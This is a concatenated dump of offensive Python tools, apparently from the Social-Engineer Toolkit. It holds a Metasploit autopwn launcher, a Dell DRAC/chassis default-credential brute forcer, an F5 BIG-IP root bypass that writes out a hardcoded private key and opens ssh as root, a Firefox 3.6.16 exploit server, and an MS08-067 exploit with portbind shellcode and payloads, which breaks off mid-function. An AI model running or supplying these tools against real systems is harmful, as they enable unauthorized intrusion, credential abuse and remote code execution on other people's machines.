                print "[*] It is recommended to now run apt-get update && apt-get upgrade && apt-get dist-upgrade && apt-get autoremove and restart SET."
                return True
            else:
                print "[:(] Your loss! Bleeding edge provides updates regularly to Metasploit, SET, and others!"

# here we give multiple options to specify for SET java applet
def applet_choice():
    
    # prompt here 
    print """
[-------------------------------------------]
Java Applet Configuration Options Below
[-------------------------------------------]

Next we need to specify whether you will use your own self generated java applet, built in applet, or your own code signed java applet. In this section, you have all three options available. The first will create a self-signed certificate if you have the java jdk installed. The second option will use the one built into SET, and the third will allow you to import your own java applet OR code sign the one built into SET if you have a certificate.

Select which option you want:

1. Make my own self-signed certificate applet.
2. Use the applet built into SET.
3. I have my own code signing certificate or applet.\n"""

    choice1 = raw_input("Enter the number you want to use [1-3]: ")

    # use the default
    if choice1 == "": choice1 = "2"

    # make our own
    if choice1 == "1":
        try: import src.html.unsigned.self_sign
        except: reload(src.html.unsigned.self_sign)

    # if we need to use the built in applet
    if choice1 == "2":
        print_status("Okay! Using the one built into SET - be careful, self signed isn't accepted in newer versions of Java :(")

    # if we want to build our own
    if choice1 == "3":
        try: import src.html.unsigned.verified_sign
        except: reload(src.html.unsigned.verified_sign)

########NEW FILE########
__FILENAME__ = PoC_SSL
#!/usr/bin/env python
import socket, os
from SocketServer import BaseServer
from BaseHTTPServer import HTTPServer
from SimpleHTTPServer import SimpleHTTPRequestHandler
from OpenSSL import SSL


class SecureHTTPServer(HTTPServer):
    def __init__(self, server_address, HandlerClass):
        BaseServer.__init__(self, server_address, HandlerClass)
        ctx = SSL.Context(SSL.SSLv23_METHOD)
        #server.pem's location (containing the server private key and
        #the server certificate).
        fpem_priv = 'newreq.pem' # server
        fpem_cli = 'newcert.pem' # cli
        ctx.use_privatekey_file (fpem_priv)
        ctx.use_certificate_file(fpem_cli)
        self.socket = SSL.Connection(ctx, socket.socket(self.address_family,
                                                        self.socket_type))
        self.server_bind()
        self.server_activate()

    def shutdown_request(self,request): request.shutdown()

class SecureHTTPRequestHandler(SimpleHTTPRequestHandler):
    def setup(self):
        self.connection = self.request
        self.rfile = socket._fileobject(self.request, "rb", self.rbufsize)
        self.wfile = socket._fileobject(self.request, "wb", self.wbufsize)


def main_server(HandlerClass = SecureHTTPRequestHandler,
         ServerClass = SecureHTTPServer):
    server_address = ('', 443) # (address, port)
    httpd = ServerClass(server_address, HandlerClass)
    sa = httpd.socket.getsockname()
    print "Serving HTTPS on", sa[0], "port", sa[1], "..."

if __name__ == '__main__':
    main_server()

########NEW FILE########
__FILENAME__ = setssl
#!/usr/bin/env python
#
# Quick SSL Cert creation method
#
# Used if you want to create self signed

from src.core.setcore import *
import subprocess,os
definepath=os.getcwd()
os.chdir(setdir)
# create the directories for us
subprocess.Popen("mkdir CA;cd CA;mkdir newcerts private", shell=True).wait()
# move into CA directory
os.chdir("CA/")
# create necessary files
subprocess.Popen("echo '01' > serial;touch index.txt", shell=True).wait()
filewrite=file("openssl.cnf", "w")
filewrite.write("""#
# OpenSSL configuration file.
#

# Establish working directory.
dir = .
[ req ]
default_bits = 1024 # Size of keys
default_keyfile = key.pem # name of generated keys
default_md = md5 # message digest algorithm
string_mask = nombstr # permitted characters
distinguished_name = req_distinguished_name

[ req_distinguished_name ]
# Variable name   Prompt string
#----------------------   ----------------------------------
0.organizationName = Organization Name (company)
organizationalUnitName = Organizational Unit Name (department, division)
emailAddress = Email Address
emailAddress_max = 40
localityName = Locality Name (city, district)
stateOrProvinceName = State or Province Name (full name)
countryName = Country Name (2 letter code)
countryName_min = 2
countryName_max = 2
commonName = Common Name (hostname, IP, or your name)
commonName_max = 64

# Default values for the above, for consistency and less typing.
# Variable name   Value
#------------------------------   ------------------------------
0.organizationName_default = The Sample Company
localityName_default = Metropolis
stateOrProvinceName_default = New York
countryName_default = US

[ v3_ca ]
basicConstraints = CA:TRUE
subjectKeyIdentifier = hash
authorityKeyIdentifier = keyid:always,issuer:always""")
# close editing of the file
filewrite.close()
subprocess.Popen("openssl req -new -x509 -extensions v3_ca -keyout private/cakey.pem -out newcert.pem -days 3650 -config ./openssl.cnf", shell=True).wait()
subprocess.Popen("cp private/cakey.pem newreq.pem;cp *.pem ../", shell=True).wait()
os.chdir(definepath)

########NEW FILE########
__FILENAME__ = webserver
import SimpleHTTPServer
import BaseHTTPServer
import httplib
import os
import sys
from src.core.setcore import *

# specify the web port
web_port = check_config("WEB_PORT=")

class StoppableHttpRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
    """http request handler with QUIT stopping the server"""

    def do_QUIT(self):
        """send 200 OK response, and set server.stop to True"""
        self.send_response(200)
        self.end_headers()
        self.server.stop = True
        
    def do_POST(self):
        # We could also process paremeters here using something like below.
        self.do_GET()

    def send_head(self):
        # This is ripped directly from SimpleHTTPRequestHandler, only the cookie part is added.
        """Common code for GET and HEAD commands.

        This sends the response code and MIME headers.

        Return value is either a file object (which has to be copied
        to the outputfile by the caller unless the command was HEAD,
        and must be closed by the caller under all circumstances), or
        None, in which case the caller has nothing further to do.

        """
        path = self.translate_path(self.path)
        f = None
        if os.path.isdir(path):
            if not self.path.endswith('/'):
                # redirect browser - doing basically what apache does
                self.send_response(301)
                self.send_header("Location", self.path + "/")
                self.end_headers()
                return None
            for index in "index.html", "index.htm":
                index = os.path.join(path, index)
                if os.path.exists(index):
                    path = index
                    break
            else:
                return self.list_directory(path)
        ctype = self.guess_type(path)
        if ctype.startswith('text/'):
            mode = 'r'
        else:
            mode = 'rb'
        try:
            f = open(path, mode)
        except IOError:
            self.send_error(404, "File not found")
            return None
        self.send_response(200)
        self.send_header("Content-type", ctype)
        fs = os.fstat(f.fileno())
        self.send_header("Content-Length", str(fs[6]))
        self.send_header("Last-Modified", self.date_time_string(fs.st_mtime))
        self.end_headers()
        return f

class StoppableHttpServer(BaseHTTPServer.HTTPServer):
    """http server that reacts to self.stop flag"""

    def serve_forever(self):
        """Handle one request at a time until stopped."""
        self.stop = False
        while not self.stop:
            self.handle_request()

# stop the http server
def stop_server(web_port):
    web_port = int(web_port)
    """send QUIT request to http server running on localhost:<port>"""
    conn = httplib.HTTPConnection("localhost:%d" % web_port)
    conn.request("QUIT", "/")
    conn.getresponse()

# start the http server
def start_server(web_port, path):
    os.chdir(path)
    web_port = int(web_port)
    server = StoppableHttpServer(('', web_port), StoppableHttpRequestHandler)
    server.serve_forever()

########NEW FILE########
__FILENAME__ = autopwn
#!/usr/bin/python

#
#
# Metasploit Autopwn functionality
#
#
from src.core import setcore
import pexpect


# this will load the database
def prep(database, ranges):
    print "\n"
    setcore.PrintStatus("Prepping the answer file based on what was specified.")
    # prep the file to be written
    filewrite=file("src/program_junk/autopwn.answer", "w")
    setcore.PrintStatus("Using the " + database + "sql driver for autopwn")
    filewrite.write("db_driver " + database + "\r\n")
    setcore.PrintStatus("Autopwn will attack the following systems: " + ranges)
    filewrite.write("db_nmap " + ranges + "\r\n")
    filewrite.write("db_autopwn -p -t -e -r\r\n")
    filewrite.write("jobs -K\r\n")
    filewrite.write("sessions -l\r\n")
    filewrite.close()
    setcore.PrintStatus("Answer file has been created and prepped for delivery into Metasploit.\n")


def launch():
    """ here we cant use the path for metasploit via setcore.meta_path. If the full path is specified it breaks
            database support for msfconsole for some reason. reported this as a bug, may be fixed soon... until then
            if path variables aren't set for msfconsole this will break, even if its specified in set_config """

    # launch the attack
    setcore.PrintStatus("Launching Metasploit and attacking the systems specified. This may take a moment..")
    # try/catch block
    try:
        child = pexpect.spawn("msfconsole -r src/program_junk/autopwn.answer")
        child.interact()

    # handle exceptions and log them
    except Exception, error: setcore.log(error)


def do_autopwn():
    print 'Doing do_autopwn'
    # pull the metasploit database
    database = setcore.meta_database()
    range = raw_input(setcore.setprompt(["19","20"], "Enter the IP ranges to attack (nmap syntax only)"))

    # prep the answer file
    prep(database, range)
    confirm_attack = raw_input(setcore.setprompt(["19","20"], "You are about to attack systems are you sure [y/n]"))

    # if we are sure, then lets do it
    if confirm_attack == "yes" or confirm_attack == "y":
        launch()

########NEW FILE########
__FILENAME__ = delldrac
#!/usr/bin/env python

###########################################
#
# Dell DRAC and Chassis Scanner
# Default Credential Check
# UN: root PW: calvin
#
# Written by Dave Kennedy (ReL1K)
# Company: TrustedSec, LLC
# Website: https://www.trustedsec.com
# @TrustedSec
#
##########################################
import urllib
import urllib2
import re
import threading
import sys
import time

class bcolors:
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    DARKCYAN = '\033[36m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BOLD = '\033[1m'
    UNDERL = '\033[4m'
    ENDC = '\033[0m'
    backBlack = '\033[40m'
    backRed = '\033[41m'
    backGreen = '\033[42m'
    backYellow = '\033[43m'
    backBlue = '\033[44m'
    backMagenta = '\033[45m'
    backCyan = '\033[46m'
    backWhite = '\033[47m'

    def disable(self):
        self.PURPLE = ''
        self.CYAN = ''
        self.BLUE = ''
        self.GREEN = ''
        self.YELLOW = ''
        self.RED = ''
        self.ENDC = ''
        self.BOLD = ''
        self.UNDERL = ''
        self.backBlack = ''
        self.backRed = ''
        self.backGreen = ''
        self.backYellow = ''
        self.backBlue = ''
        self.backMagenta = ''
        self.backCyan = ''
        self.backWhite = ''
        self.DARKCYAN = ''

print "\n"
print "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
print "Fast-Track DellDRAC and Dell Chassis Discovery and Brute Forcer"
print ""
print "Written by Dave Kennedy @ TrustedSec"
print "https://www.trustedsec.com"
print "@TrustedSec and @HackingDave"
print "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
print ""
print "This attack vector can be used to identify default installations"
print "of Dell DRAC and Chassis installations. Once found, you can use"
print "the remote administration capabilties to mount a virtual media"
print "device and use it to load for example Back|Track or password"
print "reset iso. From there, add yourself a local administrator account"
print "or dump the SAM database. This will allow you to compromise the"
print "entire infrastructure. You will need to find a DRAC instance that"
print "has an attached server and reboot it into the iso using the virtual"
print "media device."
print ""
print "Enter the IP Address or CIDR notation below. Example: 192.168.1.1/24"
print ""
ipaddr = raw_input("Enter the IP or CIDR: ")

# try logging into DRAC, chassis is something different
def login_drac(ipaddr_single):
    # default post string
    url = "https://%s/Applications/dellUI/RPC/WEBSES/create.asp" % (ipaddr_single)
    # post parameters
    opts = {
              "WEBVAR_PASSWORD": "calvin",
              "WEBVAR_USERNAME": "root",
              "WEBVAR_ISCMCLOGIN": 0
            }
    # URL encode it
    data = urllib.urlencode(opts)
    # our headers to pass (taken from raw post)
    headers = {
            # "Host": "10.245.196.52",
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:14.0) Gecko/20100101 Firefox/14.0.1",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-us,en;q=0.5",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "keep-alive",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Referer": "https://%s/Applications/dellUI/login.htm" % (ipaddr_single),
            "Content-Length": 63,
            "Cookie": "test=1; SessionLang=EN",
            "Pragma": "no-cache",
            "Cache-Control": "no-cache"

            }
    # request the page
    req = urllib2.Request(url, data, headers)
    try:
        # capture the response
        response = urllib2.urlopen(req, timeout=2)
        data = response.read()
        # if we failed our login, just pass through
        if "Failure_Login_IPMI_Then_LDAP" in data:
            pass
        # Failure_No_Free_Slot means there are no sessions available need to log someone off
        if "Failure_No_Free_Slot" in data:
            print (bcolors.YELLOW + "[!]" + bcolors.ENDC + " There are to many people logged but un: root and pw: calvin are legit on IP: " % (ipaddr_single))
            global global_check1
            global_check1 = 1

        # if we are presented with a username back, we are golden
        if "'USERNAME' : 'root'" in data:
            print (bcolors.GREEN + "[*]" + bcolors.ENDC + " Dell DRAC compromised! username: root and password: calvin for IP address: " + ipaddr_single)
            global global_check2
            global_check2 = 1
    # handle failed attempts and move on
    except: pass

# these are for the centralized dell chassis
def login_chassis(ipaddr_single):
    # our post URL
    url = "https://%s/cgi-bin/webcgi/login" % (ipaddr_single)
    # our post parameters
    opts = {
              "WEBSERVER_timeout": "1800",
              "user": "root",
              "password": "calvin",
              "WEBSERVER_timeout_select": "1800"
            }
    # url encode
    data = urllib.urlencode(opts)
    # headers (taken from raw POST)
    headers = {
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:14.0) Gecko/20100101 Firefox/14.0.1",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-us,en;q=0.5",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "keep-alive",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Referer": "https://%s/cgi-bin/webcgi/login" % (ipaddr_single),
            "Content-Length": 78
            }
    # request the page
    req = urllib2.Request(url, data, headers)
    try:
        # capture the response
        response = urllib2.urlopen(req, timeout=2)
        data = response.read()
        # if we failed to login
        if "login_failed_hr_top" in data:
            pass # login failed
        # to many people logged in at a given time
        if 'Connection refused, maximum sessions already in use.' in data:
            print (bcolors.YELLOW + "[!]" + bcolors.ENDC + " There are to many people logged but un: root and pw: calvin are legit on IP: " + (ipaddr_single))
            global global_check3
            global_check3 = 1

        # successful guess of passwords
        if "/cgi-bin/webcgi/index" in data:
            print (bcolors.GREEN + "[*]" + bcolors.ENDC + " Dell Chassis Compromised! username: root password: calvin for IP address: " + ipaddr_single)
            global global_check4
            global_check4 = 1

    # except and move on for failed login attempts
    except: pass

# this will check to see if we are using
# a valid IP address for scanning
def is_valid_ip(ip):
    pattern = re.compile(r"""
        ^
        (?:
          # Dotted variants:
          (?:
            # Decimal 1-255 (no leading 0's)
            [3-9]\d?|2(?:5[0-5]|[0-4]?\d)?|1\d{0,2}
          |
            0x0*[0-9a-f]{1,2}  # Hexadecimal 0x0 - 0xFF (possible leading 0's)
          |
            0+[1-3]?[0-7]{0,2} # Octal 0 - 0377 (possible leading 0's)
          )
          (?:                  # Repeat 0-3 times, separated by a dot
            \.
            (?:
              [3-9]\d?|2(?:5[0-5]|[0-4]?\d)?|1\d{0,2}
            |
              0x0*[0-9a-f]{1,2}
            |
              0+[1-3]?[0-7]{0,2}
            )
          ){0,3}
        |
          0x0*[0-9a-f]{1,8}    # Hexadecimal notation, 0x0 - 0xffffffff
        |
          0+[0-3]?[0-7]{0,10}  # Octal notation, 0 - 037777777777
        |
          # Decimal notation, 1-4294967295:
          429496729[0-5]|42949672[0-8]\d|4294967[01]\d\d|429496[0-6]\d{3}|
          42949[0-5]\d{4}|4294[0-8]\d{5}|429[0-3]\d{6}|42[0-8]\d{7}|
          4[01]\d{8}|[1-3]\d{0,9}|[4-9]\d{0,8}
        )
        $
    """, re.VERBOSE | re.IGNORECASE)
    return pattern.match(ip) is not None

# convert to 32 bit binary from standard format
def ip2bin(ip):
    b = ""
    inQuads = ip.split(".")
    outQuads = 4
    for q in inQuads:
        if q != "":
            b += dec2bin(int(q),8)
            outQuads -= 1
    while outQuads > 0:
        b += "00000000"
        outQuads -= 1
    return b

# decimal to binary conversion
def dec2bin(n,d=None):
    s = ""
    while n>0:
        if n&1:
            s = "1"+s
        else:
            s = "0"+s
        n >>= 1
    if d is not None:
        while len(s)<d:
            s = "0"+s
    if s == "": s = "0"
    return s

# convert a binary string into an IP address
def bin2ip(b):
    ip = ""
    for i in range(0,len(b),8):
        ip += str(int(b[i:i+8],2))+"."
    return ip[:-1]

# print a list of IP addresses based on the CIDR block specified
def scan(ipaddr):
    if "/" in ipaddr:
        parts = ipaddr.split("/")
        baseIP = ip2bin(parts[0])
        subnet = int(parts[1])
        if subnet == 32:
            ipaddr = bin2ip(baseIP)
        else:
            # our base ip addresses for how many we are going to be scanning
            counter = 0
            # capture the threads
            threads = []
            ipPrefix = baseIP[:-(32-subnet)]
            for i in range(2**(32-subnet)):
                ipaddr_single = bin2ip(ipPrefix+dec2bin(i, (32-subnet)))
                # if we are valid proceed
                ip_check = is_valid_ip(ipaddr_single)
                if ip_check != False:
                    # do this to limit how fast it can scan, anything more causes CPU to hose
                    if counter > 255:
                        # put a small delay in place
                        time.sleep(0.1)
                    # increase counter until 255 then delay 0.1
                    counter = counter + 1
                    # start our drac BF
                    thread = threading.Thread(target=login_drac, args=(ipaddr_single,))
                    # create a list of our threads in a dictionary
                    threads.append(thread)
                    # start the thread
                    thread.start()
                    # same as above just on the chassis
                    thread = threading.Thread(target=login_chassis, args=(ipaddr_single,))
                    # append the thread
                    threads.append(thread)
                    # start the thread
                    thread.start()

            # wait for all the threads to terminate
            for thread in threads:
                thread.join()

    # if we are using a single IP address then just do this
    if not "/" in ipaddr:
        login_drac(ipaddr)
        login_chassis(ipaddr)


print (bcolors.GREEN + "[*]" + bcolors.ENDC + " Scanning IP addresses, this could take a few minutes depending on how large the subnet range...")
print (bcolors.GREEN + "[*]" + bcolors.ENDC + " As an example, a /16 can take an hour or two.. A slash 24 is only a couple seconds. Be patient.")

# set global variables to see if we were successful
global_check1 = 0
global_check2 = 0
global_check3 = 0
global_check4 = 0

# kick off the scan
scan(ipaddr)
if global_check1 or global_check2 or global_check3 or global_check4 == 1:
    print (bcolors.GREEN + "[*]" + bcolors.ENDC + " DellDrac / Chassis Brute Forcer has finished scanning. Happy Hunting =)")
else:
    print (bcolors.RED + "[!]" + bcolors.ENDC + " Sorry, unable to find any of the Dell servers with default creds..Good luck :(")


raw_input("Press {return} to exit.")

########NEW FILE########
__FILENAME__ = f5
#!/usr/bin/python
#
# Title: F5 BIG-IP Remote Root Authentication Bypass Vulnerability (py)
#
# Quick script written by Dave Kennedy (ReL1K) for F5 authentication root bypass
# http://www.trustedsec.com
#
#
import subprocess,os

filewrite = file("priv.key", "w")
filewrite.write("""-----BEGIN RSA PRIVATE KEY-----
MIICWgIBAAKBgQC8iELmyRPPHIeJ//uLLfKHG4rr84HXeGM+quySiCRgWtxbw4rh
UlP7n4XHvB3ixAKdWfys2pqHD/Hqx9w4wMj9e+fjIpTi3xOdh/YylRWvid3Pf0vk
OzWftKLWbay5Q3FZsq/nwjz40yGW3YhOtpK5NTQ0bKZY5zz4s2L4wdd0uQIBIwKB
gBWL6mOEsc6G6uszMrDSDRbBUbSQ26OYuuKXMPrNuwOynNdJjDcCGDoDmkK2adDF
8auVQXLXJ5poOOeh0AZ8br2vnk3hZd9mnF+uyDB3PO/tqpXOrpzSyuITy5LJZBBv
7r7kqhyBs0vuSdL/D+i1DHYf0nv2Ps4aspoBVumuQid7AkEA+tD3RDashPmoQJvM
2oWS7PO6ljUVXszuhHdUOaFtx60ZOg0OVwnh+NBbbszGpsOwwEE+OqrKMTZjYg3s
37+x/wJBAMBtwmoi05hBsA4Cvac66T1Vdhie8qf5dwL2PdHfu6hbOifSX/xSPnVL
RTbwU9+h/t6BOYdWA0xr0cWcjy1U6UcCQQDBfKF9w8bqPO+CTE2SoY6ZiNHEVNX4
rLf/ycShfIfjLcMA5YAXQiNZisow5xznC/1hHGM0kmF2a8kCf8VcJio5AkBi9p5/
uiOtY5xe+hhkofRLbce05AfEGeVvPM9V/gi8+7eCMa209xjOm70yMnRHIBys8gBU
Ot0f/O+KM0JR0+WvAkAskPvTXevY5wkp5mYXMBlUqEd7R3vGBV/qp4BldW5l0N4G
LesWvIh6+moTbFuPRoQnGO2P6D7Q5sPPqgqyefZS
-----END RSA PRIVATE KEY-----""")
filewrite.close()
subprocess.Popen("chmod 700 priv.key", shell=True).wait()
print """
Title: F5 BIG-IP Remote Root Authentication Bypass Vulnerability (py)

Quick script written by Dave Kennedy (ReL1K) for F5 authentication root bypass
http://www.trustedsec.com
"""
ipaddr=raw_input("Enter the IP address of the F5: ")
subprocess.Popen("ssh -i priv.key root@%s" % (ipaddr), shell=True).wait()

if os.path.isfile("priv.key"):
    os.remove("priv.key")

########NEW FILE########
__FILENAME__ = firefox_3_6_16
#!/usr/bin/env python
# Mozilla Firefox 3.6.16 mChannel Object Use After Free Exploit (Win7) by Mr_Me
from BaseHTTPServer import HTTPServer
from BaseHTTPServer import BaseHTTPRequestHandler
import sys

try:
    import psyco
    psyco.full()
except ImportError:
    pass

class myRequestHandler(BaseHTTPRequestHandler):
    try:
        def do_GET(self):
            # Always Accept GET
            self.printCustomHTTPResponse(200)

            if self.path == "/":
                target=self.client_address[0]
                self.wfile.write("""
<html>
<body>
<applet code="rubik.class" width=140 height=140></applet>
<p><b>Mozilla mChannel Object use after free</b><br />
- Found by regenrecht<br />
- MSF exploit by Rh0<br />
- Win 7 fun version by mr_me</p>
<!--
Notes:

- This exploit requires <= java 6 update 25.
- optimized heap spray and still works on mutiple tabs as
  the spray is large enough to hit the 0x10000000 block.
- If you really want the class file you can get it here:
  http://javaboutique.internet.com/Rubik/rubik.class,
  but java still loads without it.
- Tested on windows 7 ultimate (latest updates).
- http://bit.ly/qD4Jkc

-->
<object id="d"><object>
<script type="text/javascript">
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        
</script>
</body>
</html>
                """)

                self.wfile.write("""<title>Please wait...</title></head><body>""")
                self.wfile.write("""<left><body bgcolor="Black"><font color="White">
                Please wait<br>""")

                print ("\n\n[-] Exploit sent... [-]\n[-] Wait about 30 seconds and attempt to connect.[-]\n[-] Connect to IP Address: %s and port 4444 [-]" % (target))

        # Print custom HTTP Response
        def printCustomHTTPResponse(self, respcode):
            self.send_response(respcode)
            self.send_header("Content-type", "text/html")
            self.send_header("Server", "myRequestHandler")
            self.end_headers()

    # In case of exceptions, pass them
    except Exception:
        pass

httpd = HTTPServer(('', 80), myRequestHandler)

print ("""
 #####################################################################################
 # Mozilla Firefox 3.6.16 mChannel Object Use After Free Exploit (Win7) by Mr. Me.   #
 #####################################################################################
""")

print ("    [-] Starting Mozilla Firefox 3.6.16 mChannel Object Use After Free Exploit (Win7) [-]")
print ("    [-] Have someone connect to you on port 80 [-]")
print ("\n\n    <ctrl>-c to Cancel")

try:
    # handle the connections
    httpd.handle_request()
    # Serve HTTP server forever
    httpd.serve_forever()
    # Except Keyboard Interrupts and throw custom message
except KeyboardInterrupt:
    print ("\n\n    Exiting exploit...\n\n")

########NEW FILE########
__FILENAME__ = ms08067
#!/usr/bin/env python
#############################################################################
#   MS08-067 Exploit by Debasis Mohanty (aka Tr0y/nopsled)
#   www.hackingspirits.com
#   www.coffeeandsecurity.com
#   Email: d3basis.m0hanty @ gmail.com
#############################################################################

from src.core.setcore import *
import struct
import sys
import time
from threading import Thread    #Thread is imported incase you would like to modify
                                #the src to run against multiple targets.

try:
    from impacket import smb
    from impacket import uuid
    from impacket.dcerpc import dcerpc
    from impacket.dcerpc import transport
except ImportError, _:
    print 'Install the following library to make this script work'
    print 'Impacket : http://oss.coresecurity.com/projects/impacket.html'
    print 'PyCrypto : http://www.amk.ca/python/code/crypto.html'
    sys.exit(1)


print '#######################################################################'
print '#   MS08-067 Exploit by Debasis Mohanty (aka Tr0y/nopsled)'
print '#   www.hackingspirits.com'
print '#   www.coffeeandsecurity.com'
print '#   Email: d3basis.m0hanty @ gmail.com'
print '#######################################################################\n'


#Portbind shellcode from metasploit; Binds port to TCP port 4444
shellcode  = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
shellcode += "\x29\xc9\x83\xe9\xb0\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e\xe9"
shellcode += "\x4a\xb6\xa9\x83\xee\xfc\xe2\xf4\x15\x20\x5d\xe4\x01\xb3\x49\x56"
shellcode += "\x16\x2a\x3d\xc5\xcd\x6e\x3d\xec\xd5\xc1\xca\xac\x91\x4b\x59\x22"
shellcode += "\xa6\x52\x3d\xf6\xc9\x4b\x5d\xe0\x62\x7e\x3d\xa8\x07\x7b\x76\x30"
shellcode += "\x45\xce\x76\xdd\xee\x8b\x7c\xa4\xe8\x88\x5d\x5d\xd2\x1e\x92\x81"
shellcode += "\x9c\xaf\x3d\xf6\xcd\x4b\x5d\xcf\x62\x46\xfd\x22\xb6\x56\xb7\x42"
shellcode += "\xea\x66\x3d\x20\x85\x6e\xaa\xc8\x2a\x7b\x6d\xcd\x62\x09\x86\x22"
shellcode += "\xa9\x46\x3d\xd9\xf5\xe7\x3d\xe9\xe1\x14\xde\x27\xa7\x44\x5a\xf9"
shellcode += "\x16\x9c\xd0\xfa\x8f\x22\x85\x9b\x81\x3d\xc5\x9b\xb6\x1e\x49\x79"
shellcode += "\x81\x81\x5b\x55\xd2\x1a\x49\x7f\xb6\xc3\x53\xcf\x68\xa7\xbe\xab"
shellcode += "\xbc\x20\xb4\x56\x39\x22\x6f\xa0\x1c\xe7\xe1\x56\x3f\x19\xe5\xfa"
shellcode += "\xba\x19\xf5\xfa\xaa\x19\x49\x79\x8f\x22\xa7\xf5\x8f\x19\x3f\x48"
shellcode += "\x7c\x22\x12\xb3\x99\x8d\xe1\x56\x3f\x20\xa6\xf8\xbc\xb5\x66\xc1"
shellcode += "\x4d\xe7\x98\x40\xbe\xb5\x60\xfa\xbc\xb5\x66\xc1\x0c\x03\x30\xe0"
shellcode += "\xbe\xb5\x60\xf9\xbd\x1e\xe3\x56\x39\xd9\xde\x4e\x90\x8c\xcf\xfe"
shellcode += "\x16\x9c\xe3\x56\x39\x2c\xdc\xcd\x8f\x22\xd5\xc4\x60\xaf\xdc\xf9"
shellcode += "\xb0\x63\x7a\x20\x0e\x20\xf2\x20\x0b\x7b\x76\x5a\x43\xb4\xf4\x84"
shellcode += "\x17\x08\x9a\x3a\x64\x30\x8e\x02\x42\xe1\xde\xdb\x17\xf9\xa0\x56"
shellcode += "\x9c\x0e\x49\x7f\xb2\x1d\xe4\xf8\xb8\x1b\xdc\xa8\xb8\x1b\xe3\xf8"
shellcode += "\x16\x9a\xde\x04\x30\x4f\x78\xfa\x16\x9c\xdc\x56\x16\x7d\x49\x79"
shellcode += "\x62\x1d\x4a\x2a\x2d\x2e\x49\x7f\xbb\xb5\x66\xc1\x19\xc0\xb2\xf6"
shellcode += "\xba\xb5\x60\x56\x39\x4a\xb6\xa9"


#Payload for Windows 2000 target
payload_1='\x41\x00\x5c\x00\x2e\x00\x2e\x00\x5c\x00\x2e\x00\x2e\x00\x5c\x00'
payload_1+='\x41\x41\x41\x41\x41\x41\x41\x41'
payload_1+='\x41\x41\x41\x41\x41\x41\x41\x41'
payload_1+='\x41\x41'
payload_1+='\x2f\x68\x18\x00\x8b\xc4\x66\x05\x94\x04\x8b\x00\xff\xe0'
payload_1+='\x43\x43\x43\x43\x43\x43\x43\x43'
payload_1+='\x43\x43\x43\x43\x43\x43\x43\x43'
payload_1+='\x43\x43\x43\x43\x43\x43\x43\x43'
payload_1+='\x43\x43\x43\x43\x43\x43\x43\x43'
payload_1+='\x43\x43\x43\x43\x43\x43\x43\x43'
payload_1+='\xeb\xcc'
payload_1+='\x00\x00'

#Payload for Windows 2003[SP2] target
payload_2='\x41\x00\x5c\x00'
payload_2+='\x2e\x00\x2e\x00\x5c\x00\x2e\x00'
payload_2+='\x2e\x00\x5c\x00\x0a\x32\xbb\x77'
payload_2+='\x8b\xc4\x66\x05\x60\x04\x8b\x00'
payload_2+='\x50\xff\xd6\xff\xe0\x42\x84\xae'
payload_2+='\xbb\x77\xff\xff\xff\xff\x01\x00'
payload_2+='\x01\x00\x01\x00\x01\x00\x43\x43'
payload_2+='\x43\x43\x37\x48\xbb\x77\xf5\xff'
payload_2+='\xff\xff\xd1\x29\xbc\x77\xf4\x75'
payload_2+='\xbd\x77\x44\x44\x44\x44\x9e\xf5'
payload_2+='\xbb\x77\x54\x13\xbf\x77\x37\xc6'
payload_2+='\xba\x77\xf9\x75\xbd\x77\x00\x00'

target = raw_input("Enter the IP address you want to attack: ")
print "Select target:\n\n   1. Windows 2000\n   2. Windows 2003 SP2\n"
osver = raw_input("Enter the target operating system number: ")


if osver == "1":
    osver = payload_1
    print '[-]Windows 2000 payload loaded'

if osver == "2":
    osver=payload_2
    print '[-]Windows 2003[SP2] payload loaded'

class SRVSVC_Exploit(Thread):
    def __init__(self, target, osver, port=445):
        super(SRVSVC_Exploit, self).__init__()
        self.__port   = port
        self.target   = target
        self.osver   = osver

    def __DCEPacket(self):
        print '[-]Initiating connection'
        self.__trans = transport.DCERPCTransportFactory('ncacn_np:%s[\\pipe\\browser]' % self.target)
        self.__trans.connect()
        print '[-]connected to ncacn_np:%s[\\pipe\\browser]' % self.target
        self.__dce = self.__trans.DCERPC_class(self.__trans)
        self.__dce.bind(uuid.uuidtup_to_bin(('4b324fc8-1670-01d3-1278-5a47bf6ee188', '3.0')))

        # Constructing Malicious Packet
        self.__stub='\x01\x00\x00\x00'
        self.__stub+='\xd6\x00\x00\x00\x00\x00\x00\x00\xd6\x00\x00\x00'
        self.__stub+=shellcode
        self.__stub+='\x41\x41\x41\x41\x41\x41\x41\x41'
        self.__stub+='\x41\x41\x41\x41\x41\x41\x41\x41'
        self.__stub+='\x41\x41\x41\x41\x41\x41\x41\x41'
